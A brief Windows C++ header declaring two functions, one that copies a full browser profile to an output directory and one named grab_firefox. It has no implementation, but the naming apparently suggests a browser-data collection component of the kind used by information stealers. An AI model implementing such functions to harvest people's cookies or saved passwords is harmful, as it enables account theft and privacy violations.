#ifndef BROWSERS_H
#define BROWSERS_H

#include <windows.h>
#include <string>

void copy_full_browser_profile(const std::wstring& name, const std::wstring& userDataPath, const std::wstring& outDir);
void grab_firefox(const std::wstring& outDir);

#endif